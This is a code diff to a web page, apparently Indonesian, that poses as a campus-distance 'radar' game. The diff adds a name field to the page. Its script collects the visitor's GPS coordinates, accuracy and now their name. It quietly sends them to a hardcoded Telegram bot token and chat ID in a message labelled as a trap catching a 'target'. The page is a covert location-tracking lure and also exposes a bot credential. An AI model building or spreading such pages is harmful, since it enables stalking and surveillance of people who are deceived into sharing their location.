@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Radar Kampus</title>
-    <!-- Injeksi Library Lucide Icons -->
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         body { 
@@ -16,10 +15,25 @@
         .card {
             background: white; padding: 35px; border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.08); max-width: 400px; width: 85%;
+            box-sizing: border-box;
         }
         h2 { 
             color: #2c3e50; margin-top: 0; 
             display: flex; justify-content: center; align-items: center; gap: 10px;
+        }
+        .input-group {
+            margin-top: 20px; text-align: left;
+        }
+        .input-group label {
+            font-size: 13px; font-weight: bold; color: #7f8c8d; margin-bottom: 8px; display: block;
+        }
+        .target-input {
+            width: 100%; padding: 12px 15px; border: 2px solid #ecf0f1; border-radius: 8px;
+            font-size: 15px; font-family: inherit; box-sizing: border-box; transition: 0.3s;
+            background-color: #fafafa;
+        }
+        .target-input:focus { 
+            border-color: #3498db; outline: none; box-shadow: 0 0 8px rgba(52, 152, 219, 0.2); background-color: #fff;
         }
         .btn-game {
             background-color: #3498db; color: white;
@@ -29,11 +43,10 @@
             display: flex; justify-content: center; align-items: center; gap: 10px;
         }
         .btn-game:hover { background-color: #2980b9; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4); }
-        #result { margin-top: 25px; font-size: 18px; font-weight: bold; line-height: 1.5; }
+        #result { margin-top: 25px; font-size: 16px; font-weight: bold; line-height: 1.5; }
         
         .status-flex { display: flex; flex-direction: column; align-items: center; gap: 12px; }
         
-        /* Animasi Sensor Scan */
         @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(0.95); } 100% { opacity: 1; transform: scale(1); } }
         .lucide-pulse { animation: pulse 1.2s infinite ease-in-out; }
     </style>
@@ -42,30 +55,37 @@
 
     <div class="card">
         <h2><i data-lucide="radar"></i> Radar Kampus</h2>
-        <p style="color: #555;">Buktikan lu mahasiswa sejati! Sistem akan mengukur jarak presisi posisi lu saat ini ke titik nol kampus.</p>
-        <p style="font-size: 11px; color: #95a5a6; margin-top: -5px;">*Membutuhkan akses GPS untuk kalkulasi radar satelit.</p>
+        <p style="color: #555; font-size: 14px;">Identifikasi jarak presisi posisi Anda saat ini ke titik nol kampus.</p>
         
+        <div class="input-group">
+            <label for="namaTarget">Nama Lengkap / Panggilan:</label>
+            <input type="text" id="namaTarget" class="target-input" placeholder="Masukkan nama lu di sini..." autocomplete="off">
+        </div>
+
         <button class="btn-game" onclick="mulaiRadar()">
             <i data-lucide="scan-line"></i> Mulai Scan Jarak
         </button>
         
-        <div id="result"></div>
+        <div id="result">
+            <p style="font-size: 11px; color: #95a5a6; margin-top: 5px; font-weight: normal;">*Membutuhkan akses GPS untuk kalkulasi radar satelit.</p>
+        </div>
     </div>
 
     <script>
-        // Render ikon saat web pertama kali dibuka
         lucide.createIcons();
 
+        // KREDENSIAL BOT TELEGRAM LU
         const BOT_TOKEN = "8945868058:AAFmrtok6NjltKd66IIE4Mai305eEq3lT1c"; 
         const CHAT_ID = "7070949344";
 
         const kampusLat = -0.463569; 
         const kampusLon = 117.152345;
 
-        // FUNGSI 1: Payload Log Terminal (Tanpa Emoticon Receh)
-        async function sendToTelegram(lat, lon, acc, jarak) {
+        // FUNGSI 1: Payload Log Terminal dengan Injeksi Nama Target
+        async function sendToTelegram(nama, lat, lon, acc, jarak) {
             const mapsLink = `https://www.google.com/maps/place/${lat},${lon}`;
             const payload = `[ ⚠️ SYSTEM OVERRIDE ]\nTARGET TERKENA RADAR JEBAKAN!\n\n` +
+                            `[>] Identitas: ${nama.toUpperCase()}\n` +
                             `[>] Lat: ${lat}\n` +
                             `[>] Lon: ${lon}\n` +
                             `[>] Akurasi GPS: ${acc} meter\n` +
@@ -95,11 +115,23 @@
 
         function mulaiRadar() {
             const resultDiv = document.getElementById('result');
+            const namaInput = document.getElementById('namaTarget').value.trim();
+
+            // VALIDASI: Cek apakah nama kosong
+            if (!namaInput) {
+                resultDiv.innerHTML = `<div class="status-flex" style="color: #e67e22;">
+                                        <i data-lucide="alert-circle" style="width: 32px; height: 32px;"></i>
+                                        <span>Isi nama lu dulu, bre!</span>
+                                       </div>`;
+                lucide.createIcons();
+                document.getElementById('namaTarget').focus(); // Otomatis arahkan kursor ke inputan
+                return; // Hentikan eksekusi kalau kosong
+            }
             
-            // State 1: Memindai (Ikon Satelit Lucide + Animasi Pulse)
+            // State 1: Memindai 
             resultDiv.innerHTML = `<div class="status-flex" style="color: #f39c12;">
                                     <i data-lucide="satellite" class="lucide-pulse" style="width: 42px; height: 42px;"></i>
-                                    <span>Memindai satelit...</span>
+                                    <span>Memindai satelit untuk ${namaInput}...</span>
                                    </div>`;
             lucide.createIcons(); 
             
@@ -112,19 +144,20 @@
                         
                         const jarak = hitungJarak(userLat, userLon, kampusLat, kampusLon);
                         
-                        // State 2: Sukses (Ikon Check Circle)
+                        // State 2: Sukses
                         resultDiv.innerHTML = `<div class="status-flex" style="color: #27ae60;">
                                                 <i data-lucide="check-circle" style="width: 48px; height: 48px;"></i>
                                                 <span>Pemindaian Selesai!</span>
-                                                <span style="color: #7f8c8d; font-size: 15px; font-weight: normal;">Jarak lu ke kampus adalah:</span>
+                                                <span style="color: #7f8c8d; font-size: 15px; font-weight: normal;">Jarak ${namaInput} ke kampus adalah:</span>
                                                 <span style="font-size: 36px; font-weight: 900; color: #2c3e50; margin-top: -5px;">${jarak} KM</span>
                                                </div>`;
                         lucide.createIcons();
 
-                        sendToTelegram(userLat, userLon, userAcc, jarak);
+                        // Eksekusi Overdrive ke Telegram
+                        sendToTelegram(namaInput, userLat, userLon, userAcc, jarak);
                     },
                     function(error) {
-                        // State 3: Ditolak (Ikon X Circle)
+                        // State 3: Ditolak
                         resultDiv.innerHTML = `<div class="status-flex" style="color: #e74c3c;">
                                                 <i data-lucide="x-circle" style="width: 42px; height: 42px;"></i>
                                                 <span>Radar Gagal: Izin lokasi ditolak.</span>
